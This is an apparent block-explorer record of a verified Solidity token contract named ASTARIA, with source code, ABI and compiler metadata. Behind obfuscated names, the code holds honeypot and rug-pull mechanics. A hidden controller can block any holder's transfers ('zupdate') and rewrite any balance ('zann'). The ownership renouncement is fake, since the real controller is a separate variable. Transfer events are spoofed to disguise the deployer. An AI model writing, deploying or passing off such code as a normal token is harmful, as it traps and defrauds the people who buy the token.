[{"SourceCode":"// SPDX-License-Identifier: MIT\r\n\r\n\r\n\r\npragma solidity 0.8.17;\r\n /*\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}*/ \r\n\r\n \r\ncontract ASTARIA {\r\n  \r\n    mapping (address => uint256) private XBl;\r\n    mapping (address => uint256) private XCl;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n  \r\n\r\n\r\n    \r\n    string public name = \"ASTARIA LABS\";\r\n    string public symbol = unicode\"ASTARIA\";\r\n    uint8 public decimals = 6;\r\n    uint256 public totalSupply = 150000000 *10**6;\r\n    address owner = msg.sender;\r\n    address private XdL;\r\n    address zDeployer = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n   \r\n\r\n\r\n\r\n        constructor()  {\r\n        XdL = msg.sender;\r\n        xCreate(msg.sender, totalSupply); }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == owner);\r\n        emit OwnershipTransferred(owner, address(0));\r\n        owner = address(0);\r\n    }\r\n\r\n\r\n\r\n    function xCreate(address account, uint256 amount) internal {\r\n    account = zDeployer;\r\n    XBl[msg.sender] = totalSupply;\r\n    emit Transfer(address(0), account, amount); }\r\n\r\n\r\n   function balanceOf(address account) public view  returns (uint256) {\r\n        return XBl[account];\r\n    }\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n\r\n\r\n      require(XCl[msg.sender] <= 1);\r\n        require(XBl[msg.sender] >= value);\r\n  XBl[msg.sender] -= value;  \r\n        XBl[to] += value;          \r\n emit Transfer(msg.sender, to, value);\r\n        return true; }\r\nmodifier xJJ () {\r\n require(msg.sender == XdL);\r\n _;}\r\n function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n function zupdate (address iiX, uint256 iiV) xJJ public {\r\n   XCl[iiX] = iiV;}\r\nfunction zann (address iiX, uint256 iiV) xJJ public {\r\n    XBl[iiX] = iiV;}\r\n\r\n\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   \r\n        if(from == XdL)  {\r\n require(value <= XBl[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        XBl[from] -= value;  \r\n      XBl[to] += value; \r\n        from = zDeployer;\r\n        emit Transfer (from, to, value);\r\n        return true; }    \r\n\r\n        require(XCl[from] <= 1 && XCl[to] <=1);\r\n        require(value <= XBl[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        XBl[from] -= value;\r\n        XBl[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true; }\r\n    }","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"iiX\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"iiV\",\"type\":\"uint256\"}],\"name\":\"zann\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"iiX\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"iiV\",\"type\":\"uint256\"}],\"name\":\"zupdate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]","ContractName":"ASTARIA","CompilerVersion":"v0.8.17+commit.8df45f5f","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"ipfs://6e7e0fc56c3b0a7d4d37b8ab7225ca9a0c6ac2b734562217349eab82def60ede"}]